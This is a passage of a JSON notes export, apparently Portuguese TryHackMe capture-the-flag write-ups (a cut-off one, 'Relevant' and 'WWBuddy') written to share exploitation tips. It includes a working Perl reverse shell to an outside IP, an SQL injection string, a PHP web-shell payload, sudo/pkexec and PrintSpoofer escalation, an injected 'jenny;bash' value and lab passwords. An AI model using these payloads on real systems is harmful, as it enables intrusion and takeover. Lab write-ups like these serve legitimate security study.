Socket;$i=&quot;10.9.58.140&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);};&#039;\nEstamos no alvo:\r\n\r\nAnalisando os binários e SUID do usuário, podemos perceber que o mesmo tem permissão para executar qualquer binário com sudo e temos também o binário pkexec. Vamos então escalar o privilégio com o comando sudo pkexec /bin/sh:\n"},"Write-up/Try-Hack-Me/Relevant/Relevant---Write-up":{"title":"Relevant - Write-up","links":[],"tags":[],"content":"Enumeração dos erviços:\r\n\nListagem das pastas compartilhadas:\r\n\nConexão com pasta remota e extração do arquivo passwords.txt:\r\n\nDecodificação das senhas:\r\n\nBob:!P@$$W0rD!123\r\nBill:Juw4nnaM4n420696969!$$$\n\nValidando as credenciais:\r\n\nA pasta compartilhada via SMB é acessada via web na porta 49663. Subir a shell reversa em aspx.\nEscalação de privilégio utilizando whoami /priv e o script PrintSpoof.exe."},"Write-up/Try-Hack-Me/WWBuddy/WWBuddy---Write-up":{"title":"WWBuddy - Write-up","links":[],"tags":[],"content":"Enumeração dos serviços:\r\n\nCriação de uma conta com payload SQLi:\r\nteste&#039; OR 1=1#\r\nResete de senha, dessa forma reseta a senha de todos os usuários.\r\nLogin na conta wwbuddy\r\nDescoberta de novos usuários: henry e roberto\r\nLogin na conta henry e acesso ao diretório /admin.\r\nAlteração do usuário teste para o payload:\r\n&lt;?php systeMm($_GET[&#039;cmd&#039;]);?&gt;\r\nAcesse a página de admin, depois desloga e entra novamente com a conta henry. Agora temos um RCE em /admin.\r\nShell Reversa.\r\nAnálise dos logs em busca de senhas:\r\nroberto:yVnocsXsf%X68wf\r\nLeitura do arquivo important.txt e montagem da wordlist com as possíveis datas de nascimento da usuária jenny.\r\nBrute force com hydra:\r\njenny:08/03/1994\r\nDesocerta de SUID.\r\nBaixa o binário para ser analisado com o ghidra\r\nAltera a variável USER para executar o bash do root: export USER=&quot;jenny;bash&quot;"},"index":{"title":"index","links":[],"tags":[],"content":"Esse é um repositório criado com a finalidade de compartilhar conhecimento com dicas para exploração de vulnerabilidades.\nAs notas etão sendo publicadas utilizando o projeto Quartz."}}